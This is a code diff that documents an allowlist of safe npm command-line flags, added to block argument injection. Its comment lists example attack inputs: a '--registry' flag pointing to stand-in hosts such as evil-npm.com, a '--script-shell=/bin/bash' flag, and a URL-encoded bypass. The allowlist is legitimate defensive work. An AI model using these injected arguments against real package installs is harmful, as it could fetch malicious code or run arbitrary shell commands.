@@ -20,8 +20,28 @@ import { IntegrityChecker } from '../core/integrity-checker.js'
 const logger = getModuleLogger()
 
 /**
- * Whitelist of safe npm arguments
+ * SEC-001: Whitelist of Safe NPM Arguments
  * Security: Only allow known-safe flags to prevent argument injection
+ *
+ * Rationale:
+ * - ❌ NOT allowing: --registry (could point to malicious registry)
+ * - ❌ NOT allowing: --script-shell (could execute arbitrary commands)
+ * - ❌ NOT allowing: --update-notifier (could bypass security)
+ * - ✅ Allowing: --save, --save-dev, --prefer-offline (installation control)
+ *
+ * This whitelist prevents attacks like:
+ * `npm install --registry=https://evil-npm.com lodash`
+ *
+ * Attack Vectors Blocked:
+ * - ❌ Registry Injection: --registry=https://attacker.com
+ * - ❌ Shell Injection: --script-shell=/bin/bash
+ * - ❌ Arbitrary Flags: Any unknown flag starting with --
+ * - ❌ Encoded Bypass: %2d%2dregistry (decoded and blocked)
+ *
+ * References:
+ * - OWASP A01:2021 – Broken Access Control
+ * - CWE-78: Improper Neutralization of Special Elements
+ * - npm security: https://docs.npmjs.com/cli/v10/using-npm/config
  */
 const SAFE_NPM_FLAGS = new Set([
   '--prefer-offline',
